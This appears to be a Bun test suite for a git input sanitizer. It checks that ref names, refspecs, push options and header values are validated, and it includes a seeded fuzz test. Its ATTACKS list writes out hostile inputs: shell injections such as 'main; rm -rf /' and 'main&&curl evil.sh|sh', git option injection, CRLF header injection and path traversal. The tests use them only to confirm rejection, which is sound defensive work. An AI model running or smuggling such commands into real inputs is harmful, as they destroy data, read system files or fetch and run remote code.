import { describe, expect, test } from "bun:test";
import { isSafeHeaderValue, isSafePushOption, isSafeRef, isSafeRefspec } from "../src/core/sanitize.js";

const ATTACKS = [
  "main; rm -rf /", "main$(id)", "main`id`", "main|cat /etc/passwd", "main&&curl evil.sh|sh", "-oProxyCommand=x", "--upload-pack=evil",
  "a\nb", "a\r\nX-Injected: 1", "a\0b", "refs/heads/../../x", "x..y", "x@{1}", "a b", "a\tb", "a'b", 'a"b', "a\\b", "a*b", "a?b", "a[b", "a~b", "a^b", "a:b",
  "main.lock", "/abs", "dir//x", "dir/.hidden", "", " ", "é", "名前", "x".repeat(300), "%0a", "${IFS}", "<script>", ">out", "#c", "!x", "{a,b}",
];

describe("git input sanitization", () => {
  test.each(ATTACKS)("refs reject %j", (v) => expect(isSafeRef(v)).toBe(false));
  test.each(ATTACKS.filter((v) => !/^[A-Za-z0-9]/.test(v) || /[^A-Za-z0-9._=:/-]/.test(v)))("push options reject %j", (v) => expect(isSafePushOption(v)).toBe(false));
  test("refs accept ordinary names", () => {
    for (const ok of ["main", "task/fix-login-ab12", "release/1.2.3", "feature_x"]) expect(isSafeRef(ok)).toBe(true);
  });
  test("refspecs need two safe sides", () => {
    expect(isSafeRefspec("abc1234:refs/heads/main")).toBe(true);
    expect(isSafeRefspec("+task/x:refs/heads/task/x")).toBe(true);
    for (const bad of ["a:b:c", "main;id:refs/heads/main", "main:refs/heads/x y", ":refs/heads/x"]) expect(isSafeRefspec(bad)).toBe(false);
  });
  test("header values refuse control characters", () => {
    expect(isSafeHeaderValue("Bearer fgt_abc")).toBe(true);
    for (const bad of ["a\r\nInjected: 1", "a\nb", "a\0b", "a\x7f"]) expect(isSafeHeaderValue(bad)).toBe(false);
  });
  test("fuzz: 20,000 random strings, nothing outside the whitelist is ever accepted", () => {
    const alphabet = "abcXYZ019._/-=:;|&$`'\"\\<>(){}[]*?~^!#%@ \t\r\n\0é-";
    let seed = 1337;
    const rnd = () => ((seed = (seed * 1664525 + 1013904223) >>> 0) / 2 ** 32);
    let accepted = 0;
    for (let i = 0; i < 20_000; i++) {
      const s = Array.from({ length: 1 + Math.floor(rnd() * 24) }, () => alphabet[Math.floor(rnd() * alphabet.length)]).join("");
      if (isSafeRef(s)) { accepted++; expect(/^[A-Za-z0-9._/-]+$/.test(s)).toBe(true); expect(s.includes("..")).toBe(false); }
      if (isSafePushOption(s)) expect(/^[A-Za-z0-9._=:/-]+$/.test(s)).toBe(true);
      if (isSafeHeaderValue(s)) expect(/[\r\n\0]/.test(s)).toBe(false);
    }
    expect(accepted).toBeGreaterThan(0);
  });
});
